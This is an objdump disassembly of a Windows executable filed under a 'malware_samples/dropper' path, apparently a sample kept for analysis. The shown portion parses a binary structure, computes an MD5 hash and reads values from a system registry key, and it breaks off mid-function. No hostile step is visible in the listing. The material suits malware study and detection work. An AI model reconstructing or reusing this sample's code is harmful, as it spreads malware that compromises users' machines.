
malware_samples/dropper/1e14cd78be0e1708963e601d2f4ca19fc94b46c034314489508d22b54786e926.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	83 ec 14             	sub    $0x14,%esp
  401003:	a1 08 d6 41 00       	mov    0x41d608,%eax
  401008:	33 c4                	xor    %esp,%eax
  40100a:	89 44 24 10          	mov    %eax,0x10(%esp)
  40100e:	53                   	push   %ebx
  40100f:	55                   	push   %ebp
  401010:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  401014:	56                   	push   %esi
  401015:	8b d9                	mov    %ecx,%ebx
  401017:	8d 74 24 0c          	lea    0xc(%esp),%esi
  40101b:	8b c5                	mov    %ebp,%eax
  40101d:	e8 fe 2a 00 00       	call   0x403b20
  401022:	85 c0                	test   %eax,%eax
  401024:	74 58                	je     0x40107e
  401026:	33 f6                	xor    %esi,%esi
  401028:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  40102e:	39 74 24 0c          	cmp    %esi,0xc(%esp)
  401032:	76 33                	jbe    0x401067
  401034:	8d 44 24 10          	lea    0x10(%esp),%eax
  401038:	50                   	push   %eax
  401039:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  40103c:	8b d5                	mov    %ebp,%edx
  40103e:	e8 6d 2d 00 00       	call   0x403db0
  401043:	83 c4 04             	add    $0x4,%esp
  401046:	85 c0                	test   %eax,%eax
  401048:	74 34                	je     0x40107e
  40104a:	b9 00 f0 00 00       	mov    $0xf000,%ecx
  40104f:	66 39 4c 24 16       	cmp    %cx,0x16(%esp)
  401054:	75 0a                	jne    0x401060
  401056:	8b 17                	mov    (%edi),%edx
  401058:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  40105b:	89 04 93             	mov    %eax,(%ebx,%edx,4)
  40105e:	ff 07                	incl   (%edi)
  401060:	46                   	inc    %esi
  401061:	3b 74 24 0c          	cmp    0xc(%esp),%esi
  401065:	72 cd                	jb     0x401034
  401067:	b8 01 00 00 00       	mov    $0x1,%eax
  40106c:	5e                   	pop    %esi
  40106d:	5d                   	pop    %ebp
  40106e:	5b                   	pop    %ebx
  40106f:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401073:	33 cc                	xor    %esp,%ecx
  401075:	e8 d5 7e 00 00       	call   0x408f4f
  40107a:	83 c4 14             	add    $0x14,%esp
  40107d:	c3                   	ret
  40107e:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401082:	5e                   	pop    %esi
  401083:	5d                   	pop    %ebp
  401084:	5b                   	pop    %ebx
  401085:	33 cc                	xor    %esp,%ecx
  401087:	33 c0                	xor    %eax,%eax
  401089:	e8 c1 7e 00 00       	call   0x408f4f
  40108e:	83 c4 14             	add    $0x14,%esp
  401091:	c3                   	ret
  401092:	cc                   	int3
  401093:	cc                   	int3
  401094:	cc                   	int3
  401095:	cc                   	int3
  401096:	cc                   	int3
  401097:	cc                   	int3
  401098:	cc                   	int3
  401099:	cc                   	int3
  40109a:	cc                   	int3
  40109b:	cc                   	int3
  40109c:	cc                   	int3
  40109d:	cc                   	int3
  40109e:	cc                   	int3
  40109f:	cc                   	int3
  4010a0:	83 ec 0c             	sub    $0xc,%esp
  4010a3:	56                   	push   %esi
  4010a4:	8d 44 24 04          	lea    0x4(%esp),%eax
  4010a8:	50                   	push   %eax
  4010a9:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4010ad:	51                   	push   %ecx
  4010ae:	33 f6                	xor    %esi,%esi
  4010b0:	53                   	push   %ebx
  4010b1:	8b c7                	mov    %edi,%eax
  4010b3:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4010ba:	00 
  4010bb:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4010c2:	00 
  4010c3:	89 74 24 10          	mov    %esi,0x10(%esp)
  4010c7:	e8 e4 2b 00 00       	call   0x403cb0
  4010cc:	83 c4 0c             	add    $0xc,%esp
  4010cf:	85 c0                	test   %eax,%eax
  4010d1:	74 73                	je     0x401146
  4010d3:	66 83 7c 24 04 01    	cmpw   $0x1,0x4(%esp)
  4010d9:	0f 85 98 00 00 00    	jne    0x401177
  4010df:	81 3b 6f 6c 57 63    	cmpl   $0x63576c6f,(%ebx)
  4010e5:	0f 85 8c 00 00 00    	jne    0x401177
  4010eb:	81 bb 94 02 00 00 3d 	cmpl   $0x6232383d,0x294(%ebx)
  4010f2:	38 32 62 
  4010f5:	0f 85 7c 00 00 00    	jne    0x401177
  4010fb:	0f b7 8b 84 00 00 00 	movzwl 0x84(%ebx),%ecx
  401102:	0f b7 c6             	movzwl %si,%eax
  401105:	8d 14 40             	lea    (%eax,%eax,2),%edx
  401108:	66 39 0c 95 44 a3 41 	cmp    %cx,0x41a344(,%edx,4)
  40110f:	00 
  401110:	74 11                	je     0x401123
  401112:	46                   	inc    %esi
  401113:	66 83 fe 01          	cmp    $0x1,%si
  401117:	72 e9                	jb     0x401102
  401119:	b8 01 00 00 00       	mov    $0x1,%eax
  40111e:	5e                   	pop    %esi
  40111f:	83 c4 0c             	add    $0xc,%esp
  401122:	c3                   	ret
  401123:	66 83 fe 01          	cmp    $0x1,%si
  401127:	73 4e                	jae    0x401177
  401129:	8b 44 24 08          	mov    0x8(%esp),%eax
  40112d:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401131:	8b d0                	mov    %eax,%edx
  401133:	05 90 00 00 00       	add    $0x90,%eax
  401138:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40113c:	83 d1 00             	adc    $0x0,%ecx
  40113f:	75 05                	jne    0x401146
  401141:	83 f8 ff             	cmp    $0xffffffff,%eax
  401144:	76 07                	jbe    0x40114d
  401146:	33 c0                	xor    %eax,%eax
  401148:	5e                   	pop    %esi
  401149:	83 c4 0c             	add    $0xc,%esp
  40114c:	c3                   	ret
  40114d:	89 87 a8 00 00 00    	mov    %eax,0xa8(%edi)
  401153:	8b 44 24 14          	mov    0x14(%esp),%eax
  401157:	81 c2 98 02 00 00    	add    $0x298,%edx
  40115d:	c7 87 ac 00 00 00 00 	movl   $0x200,0xac(%edi)
  401164:	02 00 00 
  401167:	89 97 b0 00 00 00    	mov    %edx,0xb0(%edi)
  40116d:	85 c0                	test   %eax,%eax
  40116f:	74 06                	je     0x401177
  401171:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  401177:	b8 01 00 00 00       	mov    $0x1,%eax
  40117c:	5e                   	pop    %esi
  40117d:	83 c4 0c             	add    $0xc,%esp
  401180:	c3                   	ret
  401181:	cc                   	int3
  401182:	cc                   	int3
  401183:	cc                   	int3
  401184:	cc                   	int3
  401185:	cc                   	int3
  401186:	cc                   	int3
  401187:	cc                   	int3
  401188:	cc                   	int3
  401189:	cc                   	int3
  40118a:	cc                   	int3
  40118b:	cc                   	int3
  40118c:	cc                   	int3
  40118d:	cc                   	int3
  40118e:	cc                   	int3
  40118f:	cc                   	int3
  401190:	53                   	push   %ebx
  401191:	56                   	push   %esi
  401192:	8b f0                	mov    %eax,%esi
  401194:	33 c0                	xor    %eax,%eax
  401196:	89 01                	mov    %eax,(%ecx)
  401198:	89 41 04             	mov    %eax,0x4(%ecx)
  40119b:	89 41 08             	mov    %eax,0x8(%ecx)
  40119e:	89 41 0c             	mov    %eax,0xc(%ecx)
  4011a1:	89 41 10             	mov    %eax,0x10(%ecx)
  4011a4:	89 41 14             	mov    %eax,0x14(%ecx)
  4011a7:	89 41 18             	mov    %eax,0x18(%ecx)
  4011aa:	89 41 1c             	mov    %eax,0x1c(%ecx)
  4011ad:	89 41 20             	mov    %eax,0x20(%ecx)
  4011b0:	89 41 24             	mov    %eax,0x24(%ecx)
  4011b3:	8b 06                	mov    (%esi),%eax
  4011b5:	57                   	push   %edi
  4011b6:	3b 44 24 10          	cmp    0x10(%esp),%eax
  4011ba:	0f 87 0b 02 00 00    	ja     0x4013cb
  4011c0:	8b d8                	mov    %eax,%ebx
  4011c2:	83 fb 08             	cmp    $0x8,%ebx
  4011c5:	73 0f                	jae    0x4011d6
  4011c7:	68 ac a8 41 00       	push   $0x41a8ac
  4011cc:	68 21 04 00 00       	push   $0x421
  4011d1:	e9 ff 01 00 00       	jmp    0x4013d5
  4011d6:	b8 00 01 00 00       	mov    $0x100,%eax
  4011db:	66 39 46 04          	cmp    %ax,0x4(%esi)
  4011df:	74 0f                	je     0x4011f0
  4011e1:	68 bc a8 41 00       	push   $0x41a8bc
  4011e6:	68 23 04 00 00       	push   $0x423
  4011eb:	e9 e5 01 00 00       	jmp    0x4013d5
  4011f0:	83 c6 08             	add    $0x8,%esi
  4011f3:	0f b7 56 02          	movzwl 0x2(%esi),%edx
  4011f7:	8d 46 02             	lea    0x2(%esi),%eax
  4011fa:	83 eb 08             	sub    $0x8,%ebx
  4011fd:	8b fe                	mov    %esi,%edi
  4011ff:	3b d3                	cmp    %ebx,%edx
  401201:	77 2b                	ja     0x40122e
  401203:	0f b7 10             	movzwl (%eax),%edx
  401206:	03 f2                	add    %edx,%esi
  401208:	0f b7 10             	movzwl (%eax),%edx
  40120b:	2b da                	sub    %edx,%ebx
  40120d:	0f b7 17             	movzwl (%edi),%edx
  401210:	83 ea 01             	sub    $0x1,%edx
  401213:	74 3a                	je     0x40124f
  401215:	83 ea 01             	sub    $0x1,%edx
  401218:	74 2c                	je     0x401246
  40121a:	83 ea 01             	sub    $0x1,%edx
  40121d:	74 1e                	je     0x40123d
  40121f:	68 cc a8 41 00       	push   $0x41a8cc
  401224:	68 37 04 00 00       	push   $0x437
  401229:	e9 a7 01 00 00       	jmp    0x4013d5
  40122e:	68 ac a8 41 00       	push   $0x41a8ac
  401233:	68 2a 04 00 00       	push   $0x42a
  401238:	e9 98 01 00 00       	jmp    0x4013d5
  40123d:	c7 41 04 02 00 00 00 	movl   $0x2,0x4(%ecx)
  401244:	eb 10                	jmp    0x401256
  401246:	c7 41 04 01 00 00 00 	movl   $0x1,0x4(%ecx)
  40124d:	eb 07                	jmp    0x401256
  40124f:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  401256:	0f b7 00             	movzwl (%eax),%eax
  401259:	8b 54 24 14          	mov    0x14(%esp),%edx
  40125d:	83 c7 04             	add    $0x4,%edi
  401260:	83 c0 fc             	add    $0xfffffffc,%eax
  401263:	89 3a                	mov    %edi,(%edx)
  401265:	8b 54 24 18          	mov    0x18(%esp),%edx
  401269:	89 02                	mov    %eax,(%edx)
  40126b:	85 c0                	test   %eax,%eax
  40126d:	7f 0f                	jg     0x40127e
  40126f:	68 ac a8 41 00       	push   $0x41a8ac
  401274:	68 3c 04 00 00       	push   $0x43c
  401279:	e9 57 01 00 00       	jmp    0x4013d5
  40127e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401282:	8b 54 24 20          	mov    0x20(%esp),%edx
  401286:	89 30                	mov    %esi,(%eax)
  401288:	89 1a                	mov    %ebx,(%edx)
  40128a:	85 db                	test   %ebx,%ebx
  40128c:	0f 8e c2 00 00 00    	jle    0x401354
  401292:	0f b7 7e 02          	movzwl 0x2(%esi),%edi
  401296:	8d 46 02             	lea    0x2(%esi),%eax
  401299:	8b d6                	mov    %esi,%edx
  40129b:	3b fb                	cmp    %ebx,%edi
  40129d:	0f 87 bf 00 00 00    	ja     0x401362
  4012a3:	0f b7 38             	movzwl (%eax),%edi
  4012a6:	03 f7                	add    %edi,%esi
  4012a8:	0f b7 38             	movzwl (%eax),%edi
  4012ab:	0f b7 00             	movzwl (%eax),%eax
  4012ae:	2b df                	sub    %edi,%ebx
  4012b0:	66 83 f8 04          	cmp    $0x4,%ax
  4012b4:	0f 86 b4 00 00 00    	jbe    0x40136e
  4012ba:	0f b7 3a             	movzwl (%edx),%edi
  4012bd:	83 c7 fc             	add    $0xfffffffc,%edi
  4012c0:	83 ff 05             	cmp    $0x5,%edi
  4012c3:	0f 87 81 00 00 00    	ja     0x40134a
  4012c9:	ff 24 bd f0 13 40 00 	jmp    *0x4013f0(,%edi,4)
  4012d0:	33 c0                	xor    %eax,%eax
  4012d2:	66 3b 46 fe          	cmp    -0x2(%esi),%ax
  4012d6:	0f 85 9e 00 00 00    	jne    0x40137a
  4012dc:	83 c2 04             	add    $0x4,%edx
  4012df:	89 51 08             	mov    %edx,0x8(%ecx)
  4012e2:	eb 66                	jmp    0x40134a
  4012e4:	33 c0                	xor    %eax,%eax
  4012e6:	66 3b 46 fe          	cmp    -0x2(%esi),%ax
  4012ea:	0f 85 96 00 00 00    	jne    0x401386
  4012f0:	83 c2 04             	add    $0x4,%edx
  4012f3:	89 51 0c             	mov    %edx,0xc(%ecx)
  4012f6:	eb 52                	jmp    0x40134a
  4012f8:	33 c0                	xor    %eax,%eax
  4012fa:	66 3b 46 fe          	cmp    -0x2(%esi),%ax
  4012fe:	0f 85 8e 00 00 00    	jne    0x401392
  401304:	83 c2 04             	add    $0x4,%edx
  401307:	89 51 10             	mov    %edx,0x10(%ecx)
  40130a:	eb 3e                	jmp    0x40134a
  40130c:	33 c0                	xor    %eax,%eax
  40130e:	66 3b 46 fe          	cmp    -0x2(%esi),%ax
  401312:	0f 85 86 00 00 00    	jne    0x40139e
  401318:	83 c2 04             	add    $0x4,%edx
  40131b:	89 51 14             	mov    %edx,0x14(%ecx)
  40131e:	eb 2a                	jmp    0x40134a
  401320:	66 83 f8 0c          	cmp    $0xc,%ax
  401324:	0f 85 80 00 00 00    	jne    0x4013aa
  40132a:	8b 42 04             	mov    0x4(%edx),%eax
  40132d:	8b 52 08             	mov    0x8(%edx),%edx
  401330:	89 41 18             	mov    %eax,0x18(%ecx)
  401333:	89 51 1c             	mov    %edx,0x1c(%ecx)
  401336:	eb 12                	jmp    0x40134a
  401338:	66 83 f8 0c          	cmp    $0xc,%ax
  40133c:	75 78                	jne    0x4013b6
  40133e:	8b 42 04             	mov    0x4(%edx),%eax
  401341:	8b 52 08             	mov    0x8(%edx),%edx
  401344:	89 41 20             	mov    %eax,0x20(%ecx)
  401347:	89 51 24             	mov    %edx,0x24(%ecx)
  40134a:	85 db                	test   %ebx,%ebx
  40134c:	0f 8f 40 ff ff ff    	jg     0x401292
  401352:	85 db                	test   %ebx,%ebx
  401354:	74 6c                	je     0x4013c2
  401356:	68 ac a8 41 00       	push   $0x41a8ac
  40135b:	68 6c 04 00 00       	push   $0x46c
  401360:	eb 73                	jmp    0x4013d5
  401362:	68 ac a8 41 00       	push   $0x41a8ac
  401367:	68 44 04 00 00       	push   $0x444
  40136c:	eb 67                	jmp    0x4013d5
  40136e:	68 ac a8 41 00       	push   $0x41a8ac
  401373:	68 46 04 00 00       	push   $0x446
  401378:	eb 5b                	jmp    0x4013d5
  40137a:	68 cc a8 41 00       	push   $0x41a8cc
  40137f:	68 4b 04 00 00       	push   $0x44b
  401384:	eb 4f                	jmp    0x4013d5
  401386:	68 cc a8 41 00       	push   $0x41a8cc
  40138b:	68 50 04 00 00       	push   $0x450
  401390:	eb 43                	jmp    0x4013d5
  401392:	68 cc a8 41 00       	push   $0x41a8cc
  401397:	68 55 04 00 00       	push   $0x455
  40139c:	eb 37                	jmp    0x4013d5
  40139e:	68 cc a8 41 00       	push   $0x41a8cc
  4013a3:	68 5a 04 00 00       	push   $0x45a
  4013a8:	eb 2b                	jmp    0x4013d5
  4013aa:	68 cc a8 41 00       	push   $0x41a8cc
  4013af:	68 5f 04 00 00       	push   $0x45f
  4013b4:	eb 1f                	jmp    0x4013d5
  4013b6:	68 cc a8 41 00       	push   $0x41a8cc
  4013bb:	68 64 04 00 00       	push   $0x464
  4013c0:	eb 13                	jmp    0x4013d5
  4013c2:	5f                   	pop    %edi
  4013c3:	5e                   	pop    %esi
  4013c4:	b8 01 00 00 00       	mov    $0x1,%eax
  4013c9:	5b                   	pop    %ebx
  4013ca:	c3                   	ret
  4013cb:	68 6c a8 41 00       	push   $0x41a86c
  4013d0:	68 20 04 00 00       	push   $0x420
  4013d5:	68 7c a8 41 00       	push   $0x41a87c
  4013da:	ba 01 00 00 00       	mov    $0x1,%edx
  4013df:	e8 5c 4f 00 00       	call   0x406340
  4013e4:	83 c4 0c             	add    $0xc,%esp
  4013e7:	5f                   	pop    %edi
  4013e8:	5e                   	pop    %esi
  4013e9:	33 c0                	xor    %eax,%eax
  4013eb:	5b                   	pop    %ebx
  4013ec:	c3                   	ret
  4013ed:	8d 49 00             	lea    0x0(%ecx),%ecx
  4013f0:	d0 12                	rclb   $1,(%edx)
  4013f2:	40                   	inc    %eax
  4013f3:	00 e4                	add    %ah,%ah
  4013f5:	12 40 00             	adc    0x0(%eax),%al
  4013f8:	f8                   	clc
  4013f9:	12 40 00             	adc    0x0(%eax),%al
  4013fc:	0c 13                	or     $0x13,%al
  4013fe:	40                   	inc    %eax
  4013ff:	00 20                	add    %ah,(%eax)
  401401:	13 40 00             	adc    0x0(%eax),%eax
  401404:	38 13                	cmp    %dl,(%ebx)
  401406:	40                   	inc    %eax
  401407:	00 cc                	add    %cl,%ah
  401409:	cc                   	int3
  40140a:	cc                   	int3
  40140b:	cc                   	int3
  40140c:	cc                   	int3
  40140d:	cc                   	int3
  40140e:	cc                   	int3
  40140f:	cc                   	int3
  401410:	83 ec 68             	sub    $0x68,%esp
  401413:	a1 08 d6 41 00       	mov    0x41d608,%eax
  401418:	33 c4                	xor    %esp,%eax
  40141a:	89 44 24 60          	mov    %eax,0x60(%esp)
  40141e:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  401422:	33 c9                	xor    %ecx,%ecx
  401424:	56                   	push   %esi
  401425:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  401429:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40142d:	50                   	push   %eax
  40142e:	8b 44 24 78          	mov    0x78(%esp),%eax
  401432:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401436:	c7 44 24 0c 01 23 45 	movl   $0x67452301,0xc(%esp)
  40143d:	67 
  40143e:	c7 44 24 10 89 ab cd 	movl   $0xefcdab89,0x10(%esp)
  401445:	ef 
  401446:	c7 44 24 14 fe dc ba 	movl   $0x98badcfe,0x14(%esp)
  40144d:	98 
  40144e:	c7 44 24 18 76 54 32 	movl   $0x10325476,0x18(%esp)
  401455:	10 
  401456:	e8 85 3e 00 00       	call   0x4052e0
  40145b:	83 c4 04             	add    $0x4,%esp
  40145e:	8d 74 24 08          	lea    0x8(%esp),%esi
  401462:	8b cf                	mov    %edi,%ecx
  401464:	e8 17 3f 00 00       	call   0x405380
  401469:	8b 4c 24 64          	mov    0x64(%esp),%ecx
  40146d:	5e                   	pop    %esi
  40146e:	33 cc                	xor    %esp,%ecx
  401470:	e8 da 7a 00 00       	call   0x408f4f
  401475:	83 c4 68             	add    $0x68,%esp
  401478:	c3                   	ret
  401479:	cc                   	int3
  40147a:	cc                   	int3
  40147b:	cc                   	int3
  40147c:	cc                   	int3
  40147d:	cc                   	int3
  40147e:	cc                   	int3
  40147f:	cc                   	int3
  401480:	53                   	push   %ebx
  401481:	56                   	push   %esi
  401482:	33 db                	xor    %ebx,%ebx
  401484:	57                   	push   %edi
  401485:	8b f8                	mov    %eax,%edi
  401487:	39 1d ec 02 42 00    	cmp    %ebx,0x4202ec
  40148d:	74 28                	je     0x4014b7
  40148f:	a1 d8 02 42 00       	mov    0x4202d8,%eax
  401494:	89 07                	mov    %eax,(%edi)
  401496:	8b 0d dc 02 42 00    	mov    0x4202dc,%ecx
  40149c:	89 4f 04             	mov    %ecx,0x4(%edi)
  40149f:	8b 15 e0 02 42 00    	mov    0x4202e0,%edx
  4014a5:	89 57 08             	mov    %edx,0x8(%edi)
  4014a8:	a1 e4 02 42 00       	mov    0x4202e4,%eax
  4014ad:	89 47 0c             	mov    %eax,0xc(%edi)
  4014b0:	8d 43 01             	lea    0x1(%ebx),%eax
  4014b3:	5f                   	pop    %edi
  4014b4:	5e                   	pop    %esi
  4014b5:	5b                   	pop    %ebx
  4014b6:	c3                   	ret
  4014b7:	68 00 20 00 00       	push   $0x2000
  4014bc:	e8 30 97 00 00       	call   0x40abf1
  4014c1:	8b f0                	mov    %eax,%esi
  4014c3:	83 c4 04             	add    $0x4,%esp
  4014c6:	85 f6                	test   %esi,%esi
  4014c8:	75 27                	jne    0x4014f1
  4014ca:	6a 08                	push   $0x8
  4014cc:	ff 15 a8 80 41 00    	call   *0x4180a8
  4014d2:	68 dc a8 41 00       	push   $0x41a8dc
  4014d7:	68 96 04 00 00       	push   $0x496
  4014dc:	68 7c a8 41 00       	push   $0x41a87c
  4014e1:	33 d2                	xor    %edx,%edx
  4014e3:	e8 28 4d 00 00       	call   0x406210
  4014e8:	83 c4 0c             	add    $0xc,%esp
  4014eb:	8b c3                	mov    %ebx,%eax
  4014ed:	5f                   	pop    %edi
  4014ee:	5e                   	pop    %esi
  4014ef:	5b                   	pop    %ebx
  4014f0:	c3                   	ret
  4014f1:	e8 fa 2f 00 00       	call   0x4044f0
  4014f6:	85 c0                	test   %eax,%eax
  4014f8:	7d 2b                	jge    0x401525
  4014fa:	68 ec a8 41 00       	push   $0x41a8ec
  4014ff:	68 99 04 00 00       	push   $0x499
  401504:	68 7c a8 41 00       	push   $0x41a87c
  401509:	ba 09 00 00 00       	mov    $0x9,%edx
  40150e:	e8 2d 4e 00 00       	call   0x406340
  401513:	83 c4 0c             	add    $0xc,%esp
  401516:	56                   	push   %esi
  401517:	e8 f8 95 00 00       	call   0x40ab14
  40151c:	83 c4 04             	add    $0x4,%esp
  40151f:	8b c3                	mov    %ebx,%eax
  401521:	5f                   	pop    %edi
  401522:	5e                   	pop    %esi
  401523:	5b                   	pop    %ebx
  401524:	c3                   	ret
  401525:	75 2b                	jne    0x401552
  401527:	68 04 a9 41 00       	push   $0x41a904
  40152c:	68 9b 04 00 00       	push   $0x49b
  401531:	68 7c a8 41 00       	push   $0x41a87c
  401536:	ba 0b 00 00 00       	mov    $0xb,%edx
  40153b:	e8 00 4e 00 00       	call   0x406340
  401540:	83 c4 0c             	add    $0xc,%esp
  401543:	56                   	push   %esi
  401544:	e8 cb 95 00 00       	call   0x40ab14
  401549:	83 c4 04             	add    $0x4,%esp
  40154c:	8b c3                	mov    %ebx,%eax
  40154e:	5f                   	pop    %edi
  40154f:	5e                   	pop    %esi
  401550:	5b                   	pop    %ebx
  401551:	c3                   	ret
  401552:	50                   	push   %eax
  401553:	56                   	push   %esi
  401554:	e8 b7 fe ff ff       	call   0x401410
  401559:	8b 0f                	mov    (%edi),%ecx
  40155b:	89 0d d8 02 42 00    	mov    %ecx,0x4202d8
  401561:	8b 57 04             	mov    0x4(%edi),%edx
  401564:	89 15 dc 02 42 00    	mov    %edx,0x4202dc
  40156a:	8b 47 08             	mov    0x8(%edi),%eax
  40156d:	a3 e0 02 42 00       	mov    %eax,0x4202e0
  401572:	8b 4f 0c             	mov    0xc(%edi),%ecx
  401575:	83 c4 08             	add    $0x8,%esp
  401578:	bb 01 00 00 00       	mov    $0x1,%ebx
  40157d:	56                   	push   %esi
  40157e:	89 0d e4 02 42 00    	mov    %ecx,0x4202e4
  401584:	89 1d ec 02 42 00    	mov    %ebx,0x4202ec
  40158a:	e8 85 95 00 00       	call   0x40ab14
  40158f:	83 c4 04             	add    $0x4,%esp
  401592:	5f                   	pop    %edi
  401593:	5e                   	pop    %esi
  401594:	8b c3                	mov    %ebx,%eax
  401596:	5b                   	pop    %ebx
  401597:	c3                   	ret
  401598:	cc                   	int3
  401599:	cc                   	int3
  40159a:	cc                   	int3
  40159b:	cc                   	int3
  40159c:	cc                   	int3
  40159d:	cc                   	int3
  40159e:	cc                   	int3
  40159f:	cc                   	int3
  4015a0:	83 ec 10             	sub    $0x10,%esp
  4015a3:	53                   	push   %ebx
  4015a4:	55                   	push   %ebp
  4015a5:	56                   	push   %esi
  4015a6:	57                   	push   %edi
  4015a7:	8b f0                	mov    %eax,%esi
  4015a9:	8d 44 24 18          	lea    0x18(%esp),%eax
  4015ad:	50                   	push   %eax
  4015ae:	68 19 01 02 00       	push   $0x20119
  4015b3:	33 ff                	xor    %edi,%edi
  4015b5:	57                   	push   %edi
  4015b6:	68 18 a9 41 00       	push   $0x41a918
  4015bb:	68 02 00 00 80       	push   $0x80000002
  4015c0:	8b d9                	mov    %ecx,%ebx
  4015c2:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4015c6:	ff 15 08 80 41 00    	call   *0x418008
  4015cc:	85 c0                	test   %eax,%eax
  4015ce:	0f 85 5d 01 00 00    	jne    0x401731
  4015d4:	89 06                	mov    %eax,(%esi)
  4015d6:	89 46 04             	mov    %eax,0x4(%esi)
  4015d9:	89 46 08             	mov    %eax,0x8(%esi)
  4015dc:	89 46 0c             	mov    %eax,0xc(%esi)
  4015df:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4015e3:	51                   	push   %ecx
  4015e4:	89 46 10             	mov    %eax,0x10(%esi)
  4015e7:	53                   	push   %ebx
  4015e8:	89 46 14             	mov    %eax,0x14(%esi)
  4015eb:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  4015ef:	52                   	push   %edx
  4015f0:	89 46 18             	mov    %eax,0x18(%esi)
  4015f3:	50                   	push   %eax
  4015f4:	89 46 1c             	mov    %eax,0x1c(%esi)
  4015f7:	89 46 20             	mov    %eax,0x20(%esi)
  4015fa:	8b 44 24 28          	mov    0x28(%esp),%eax
  4015fe:	68 54 a9 41 00       	push   $0x41a954
  401603:	bf 00 04 00 00       	mov    $0x400,%edi
  401608:	50                   	push   %eax
  401609:	89 7c 24 28          	mov    %edi,0x28(%esp)
  40160d:	ff 15 04 80 41 00    	call   *0x418004
  401613:	85 c0                	test   %eax,%eax
  401615:	75 1c                	jne    0x401633
  401617:	83 7c 24 14 01       	cmpl   $0x1,0x14(%esp)
  40161c:	0f 85 f6 00 00 00    	jne    0x401718
  401622:	8b 44 24 10          	mov    0x10(%esp),%eax
  401626:	2b f8                	sub    %eax,%edi
  401628:	89 1e                	mov    %ebx,(%esi)
  40162a:	8d 1c 18             	lea    (%eax,%ebx,1),%ebx
  40162d:	0f 84 e5 00 00 00    	je     0x401718
  401633:	8b 44 24 18          	mov    0x18(%esp),%eax
  401637:	8b 2d 04 80 41 00    	mov    0x418004,%ebp
  40163d:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401641:	51                   	push   %ecx
  401642:	53                   	push   %ebx
  401643:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  401647:	52                   	push   %edx
  401648:	6a 00                	push   $0x0
  40164a:	68 68 a9 41 00       	push   $0x41a968
  40164f:	50                   	push   %eax
  401650:	89 7c 24 28          	mov    %edi,0x28(%esp)
  401654:	ff d5                	call   *%ebp
  401656:	85 c0                	test   %eax,%eax
  401658:	75 1e                	jne    0x401678
  40165a:	83 7c 24 14 01       	cmpl   $0x1,0x14(%esp)
  40165f:	0f 85 b3 00 00 00    	jne    0x401718
  401665:	8b 44 24 10          	mov    0x10(%esp),%eax
  401669:	89 5e 04             	mov    %ebx,0x4(%esi)
  40166c:	2b f8                	sub    %eax,%edi
  40166e:	03 d8                	add    %eax,%ebx
  401670:	85 ff                	test   %edi,%edi
  401672:	0f 84 a0 00 00 00    	je     0x401718
  401678:	8b 44 24 18          	mov    0x18(%esp),%eax
  40167c:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401680:	51                   	push   %ecx
  401681:	53                   	push   %ebx
  401682:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  401686:	52                   	push   %edx
  401687:	6a 00                	push   $0x0
  401689:	68 7c a9 41 00       	push   $0x41a97c
  40168e:	50                   	push   %eax
  40168f:	89 7c 24 28          	mov    %edi,0x28(%esp)
  401693:	ff d5                	call   *%ebp
  401695:	85 c0                	test   %eax,%eax
  401697:	75 16                	jne    0x4016af
  401699:	83 7c 24 14 01       	cmpl   $0x1,0x14(%esp)
  40169e:	75 78                	jne    0x401718
  4016a0:	8b 44 24 10          	mov    0x10(%esp),%eax
  4016a4:	89 5e 08             	mov    %ebx,0x8(%esi)
  4016a7:	2b f8                	sub    %eax,%edi
  4016a9:	03 d8                	add    %eax,%ebx
  4016ab:	85 ff                	test   %edi,%edi
  4016ad:	74 69                	je     0x401718
  4016af:	8b 44 24 18          	mov    0x18(%esp),%eax
  4016b3:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4016b7:	51                   	push   %ecx
  4016b8:	53                   	push   %ebx
  4016b9:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  4016bd:	52                   	push   %edx
  4016be:	6a 00                	push   $0x0
  4016c0:	68 9c a9 41 00       	push   $0x41a99c
  4016c5:	50                   	push   %eax
  4016c6:	89 7c 24 28          	mov    %edi,0x28(%esp)
  4016ca:	ff d5                	call   *%ebp
  4016cc:	85 c0                	test   %eax,%eax
  4016ce:	75 48                	jne    0x401718
  4016d0:	83 7c 24 14 03       	cmpl   $0x3,0x14(%esp)
  4016d5:	75 41                	jne    0x401718
  4016d7:	8b 44 24 10          	mov    0x10(%esp),%eax
  4016db:	2b f8                	sub    %eax,%edi
  4016dd:	89 46 1c             	mov    %eax,0x1c(%esi)
  4016e0:	89 5e 20             	mov    %ebx,0x20(%esi)
  4016e3:	74 33                	je     0x401718
  4016e5:	8d 46 0c             	lea    0xc(%esi),%eax
  4016e8:	e8 93 fd ff ff       	call   0x401480
  4016ed:	85 c0                	test   %eax,%eax
  4016ef:	74 27                	je     0x401718
  4016f1:	8b 44 24 18          	mov    0x18(%esp),%eax
  4016f5:	8b 54 24 24          	mov    0x24(%esp),%edx
  4016f9:	b9 00 04 00 00       	mov    $0x400,%ecx
  4016fe:	2b cf                	sub    %edi,%ecx
  401700:	50                   	push   %eax
  401701:	89 0a                	mov    %ecx,(%edx)
  401703:	be 01 00 00 00       	mov    $0x1,%esi
